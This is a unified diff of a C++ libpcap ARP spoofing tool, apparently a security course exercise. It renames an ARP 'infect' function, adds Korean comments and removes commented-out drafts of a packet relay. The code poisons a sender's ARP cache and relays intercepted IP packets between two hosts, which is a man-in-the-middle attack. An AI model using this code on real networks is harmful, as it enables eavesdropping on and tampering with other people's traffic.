@@ -41,7 +41,8 @@ struct EthIpPacket final{
 	IcmpHdr icmp_; 
 };
 
-void arpAttack(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
+// ARP 요청(감염) 보내는 function
+void arpInfect(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
 {
     EthArpPacket packet;
 
@@ -65,6 +66,7 @@ void arpAttack(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip
     }
 }
 
+// IP패킷 Relay 해주는 function
 void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
 {
     struct pcap_pkthdr *header;
@@ -85,7 +87,7 @@ void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, con
                 // 수신된 패킷의 출발지 IP를 Ip 객체로 변환
                 Ip srcIp = ntohl(recv_packet->ip_.src_ip_);
                 
-                // IP 주소가 senderIp 또는 targetIp와 일치하는지 확인
+                // IP 주소가 senderIp와 일치하는지 확인
                 if (srcIp == senderIp) {
                     fprintf(stderr,"I got spoofed packet\n");
 
@@ -99,7 +101,7 @@ void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, con
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                     }
                 }
-
+                // IP 주소가 targetIp와 일치하는지 확인
                 else if (srcIp == targetIp) {
                     fprintf(stderr,"I got spoofed packet\n");
 
@@ -117,154 +119,6 @@ void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, con
         } 
         else if (pcap_next_res == -1 || pcap_next_res == -2) {
             printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
-        }
-    }
-}
-
-
-
-
-/*  
-void packet_relay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip) {
-    struct pcap_pkthdr *header;
-    const u_char *response;
-
-    while (true) {
-        int pcap_next_res = pcap_next_ex(handle, &header, &response);
-
-        if (pcap_next_res == 1) {
-            EthIpPacket *recv_packet = (EthIpPacket *)response;
-
-            
-            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
-                recv_packet->eth_.smac_ == sender_mac &&
-                recv_packet->eth_.dmac_ == my_mac) {
-
-                recv_packet->eth_.smac_ = my_mac;
-                recv_packet->eth_.dmac_ = target_mac;
-		
-		recv_packet->ip_.src_ip_ = inet_addr(sender_ip);
-		recv_packet->ip_.dest_ip_ = inet_addr(target_ip);
-			
-		recv_packet->icmp_.type_ = 8;
-		recv_packet->ip_.tot_len_ = htons(sizeof(IpHdr) + sizeof(IcmpHdr)); 
-
-    
-    		int packet_size = sizeof(EthHdr) + ntohs(recv_packet->ip_.tot_len_);
-
-    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), packet_size);	
-
-                //int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), sizeof(EthIpPacket));
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-
-		}
-
-            
-
-            
-            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
-                     recv_packet->eth_.smac_ == target_mac &&
-                     recv_packet->eth_.dmac_ == my_mac) {
-
-                recv_packet->eth_.smac_ = my_mac;
-                recv_packet->eth_.dmac_ = sender_mac;
-		
-		recv_packet->ip_.src_ip_ = inet_addr(target_ip);
-                recv_packet->ip_.dest_ip_ = inet_addr(sender_ip);
-
-		recv_packet->icmp_.type_ = 0;
-
-                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), sizeof(EthIpPacket));
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-            }
-    }
-
-         else if (pcap_next_res == -1 || pcap_next_res == -2) {
-            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
-            break;
-        }
-    }
-}
-*/
-/*
-void packet_relay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip) {
-    struct pcap_pkthdr *header;
-    const u_char *response;
-
-    while (true) {
-        int pcap_next_res = pcap_next_ex(handle, &header, &response);
-
-        if (pcap_next_res == 1) {
-            EthIpPacket *recv_packet = (EthIpPacket *)response;
-
-            
-            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
-                recv_packet->eth_.smac_ == sender_mac &&
-                recv_packet->eth_.dmac_ == my_mac) {
-		printf("I got a sender's packet! and source mac is:");
-		recv_packet->eth_.smac_.printMac();
-		fflush(stdout);
-                EthIpPacket new_packet;
-
-    		// Ethernet header
-    		new_packet.eth_.smac_ = my_mac;
-    		new_packet.eth_.dmac_ = target_mac;
-    		new_packet.eth_.type_ = htons(EthHdr::Ip4);
-
-    		// IP header
-    		// Note: Some fields are omitted for brevity, ensure to set them correctly
-    		new_packet.ip_.src_ip_ = inet_addr(sender_ip);  // assuming sender_ip is your IP
-    		new_packet.ip_.dest_ip_ = inet_addr(target_ip);
-
-    		
-
-    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&new_packet), sizeof(EthIpPacket));;
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-            }
-
-            
-            else if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
-                     recv_packet->eth_.smac_ == target_mac &&
-                     recv_packet->eth_.dmac_ == my_mac) {
-		    printf("I got a target's packet! and source mac is :");
-		    recv_packet->eth_.smac_.printMac();
-		    fflush(stdout);
-
-		    EthIpPacket new_packet;
-
-    // Ethernet header
-    			new_packet.eth_.smac_ = my_mac;
-    			new_packet.eth_.dmac_ = sender_mac;
-    			new_packet.eth_.type_ = htons(EthHdr::Ip4);
-
-    // IP header
-    // Note: Some fields are omitted for brevity, ensure to set them correctly
-    			new_packet.ip_.src_ip_ = inet_addr(sender_ip);  // assuming sender_ip is your IP
-    			new_packet.ip_.dest_ip_ = inet_addr(target_ip);
-
-    // ICMP header
-    
-    // Note: Set other ICMP fields as needed
-
-    // Calculate checksums
-    // ...
-
-    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&new_packet), sizeof(EthIpPacket));
-                
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-            }
-
-        } else if (pcap_next_res == -1 || pcap_next_res == -2) {
-            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
-            break;
         }
     }
 }
@@ -326,5 +180,3 @@ void recover_check(pcap_t *handle,Mac my_mac, Mac target_mac, Mac sender_mac, co
         }
         
 }
-
-*/
